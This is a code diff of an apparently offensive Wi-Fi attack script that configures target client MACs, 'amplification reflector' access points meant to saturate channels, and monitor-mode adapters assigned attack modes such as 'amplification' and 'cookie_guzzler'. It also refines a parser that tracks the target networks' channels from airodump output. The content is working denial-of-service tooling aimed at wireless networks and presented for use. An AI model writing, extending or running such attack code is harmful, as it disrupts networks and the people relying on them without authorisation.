@@ -97,6 +97,8 @@ TARGET_STA_MACS = [
 ]
 
 # --- 6. AMPLIFICATION REFLECTORS ---
+# Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
+# The more APs listed here, the greater the channel saturation.
 AMPLIFICATION_REFLECTOR_APS_5GHZ =[
     "AA:BB:CC:DD:EE:33", 
     "AA:BB:CC:DD:EE:44", 
@@ -175,8 +177,8 @@ AMPLIFICATION_REFLECTOR_APS_2_4GHZ =[
 # ==============================================================================================
 # ======================== ADAPTER CONFIGURATION ======================================
 ADAPTER_KONFIGURATION = {
-    "wlan0mon": {"band": "2.4GHz", "angriff": "double_decker"},
-    "wlan1mon": {"band": "5GHz", "angriff": "omnivore"}
+    "wlan0mon": {"band": "2.4GHz", "angriff": "amplification"},
+    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"}
 }
 
 # ======================== SHARED MEMORY FOR SCANNER =================================
@@ -247,17 +249,31 @@ def parse_airodump_csv(csv_file):
     try:
         with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
-        sections = content.split('\n')
-        for line in sections:
-            if 'BSSID' not in line or line.startswith('#') or not line.strip(): continue
-            parts = line.split(',')
-            if len(parts) >= 14 and parts[3].strip().isdigit():
-                bssid = parts[0].strip().upper()
+            
+        ap_block = content.split('\n\n')[0]
+        lines = ap_block.strip().split('\n')
+        
+        for line in lines:
+            if 'BSSID' in line or line.startswith('#') or not line.strip():
+                continue
+                
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 14:
+                bssid = parts[0].upper()
                 channel = parts[3].strip()
-                if bssid == TARGET_BSSID_2_4GHZ.upper(): results['2.4GHz'] = channel
-                elif bssid == TARGET_BSSID_5GHZ.upper(): results['5GHz'] = channel
+                
+                if not channel.isdigit():
+                    continue
+                    
+                channel_int = int(channel)
+                if bssid == TARGET_BSSID_2_4GHZ.upper() and 1 <= channel_int <= 14:
+                    results['2.4GHz'] = channel
+                elif bssid == TARGET_BSSID_5GHZ.upper() and 36 <= channel_int <= 165:
+                    results['5GHz'] = channel
+                    
     except Exception as e:
-        logger.error(f"[SCANNER PARSE] {e}")
+        logger.error(f"[SCANNER PARSE ERROR] {e}")
+        
     return results
 
 def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
